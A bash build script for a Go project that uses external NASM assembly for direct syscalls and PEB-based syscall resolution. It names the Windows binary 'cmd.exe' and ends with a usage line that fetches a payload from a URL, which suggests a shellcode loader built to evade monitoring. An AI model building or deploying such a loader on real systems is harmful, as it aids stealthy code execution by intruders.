#!/bin/bash

echo "Building Go Direct Syscall with External Assembly..."

# Step 1: Assemble the syscall assembly file
echo "Assembling do_syscall.S..."
if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "cygwin" ]]; then
    # Windows (Git Bash/MSYS2/Cygwin)
    nasm -f win64 do_syscall.S -o do_syscall.obj
    
    # Also assemble the PEB access assembly file
    echo "Assembling pkg/syscallresolve/peb_windows_amd64.s..."
    # For Go assembly files, we don't need to do anything special
    # Go will handle .s files automatically during build
    
    OBJ_FILE="do_syscall.obj"
    LIB_FILE="libdo_syscall.a"
    EXE_NAME="cmd.exe"
    export CGO_ENABLED=1
else
    # Linux/Unix
    nasm -f elf64 do_syscall.S -o do_syscall.o
    
    # Also assemble the PEB access assembly file
    echo "Assembling pkg/syscallresolve/peb_windows_amd64.s..."
    # For Go assembly files, we don't need to do anything special
    # Go will handle .s files automatically during build
    
    OBJ_FILE="do_syscall.o"
    LIB_FILE="libdo_syscall.a"
    EXE_NAME="cmd"
    export CGO_ENABLED=1
fi

# Check if assembly was successful
if [ ! -f "$OBJ_FILE" ]; then
    echo "Error: Failed to assemble do_syscall.S"
    echo "Make sure NASM is installed and in your PATH"
    exit 1
fi

# Step 2: Create a static library from the object file
echo "Creating static library..."
ar rcs "$LIB_FILE" "$OBJ_FILE"

# Check if library creation was successful
if [ ! -f "$LIB_FILE" ]; then
    echo "Error: Failed to create static library"
    echo "Make sure ar is installed and in your PATH"
    exit 1
fi

# Step 3: Build the Go project
echo "Building Go project..."
go build -o "$EXE_NAME" ./cmd

# Check if Go build was successful
if [ ! -f "$EXE_NAME" ]; then
    echo "Error: Failed to build Go project"
    exit 1
fi

echo "Build completed successfully!"
echo "Files created:"
echo "  - $OBJ_FILE (object file)"
echo "  - $LIB_FILE (static library)"
echo "  - $EXE_NAME (executable)"
echo ""
echo "Usage: ./$EXE_NAME -url http://example.com/payload.bin" 